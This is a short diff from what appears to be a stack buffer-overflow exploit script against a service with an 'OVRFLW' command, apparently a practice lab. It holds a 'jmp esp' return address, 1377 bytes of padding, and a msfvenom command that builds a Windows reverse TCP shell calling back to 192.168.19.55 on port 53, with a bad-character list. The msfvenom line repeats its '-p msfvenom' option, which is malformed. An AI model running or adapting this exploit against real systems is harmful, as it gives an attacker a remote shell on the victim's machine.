@@ -10,7 +10,7 @@ cmd = "OVRFLW "
 EIP = "\x83\x66\x52\x56" #jmp esp
 junk="A"*1377
 """
-msfvenom -p msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.55 LPORT=53 -f c -b "\x00\x04\x32\x78\x79\x91\x92\xc1\xc2" -n 50
+payload : msfvenom -p msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.55 LPORT=53 -f c -b "\x00\x04\x32\x78\x79\x91\x92\xc1\xc2" -n 50
 """
 
 
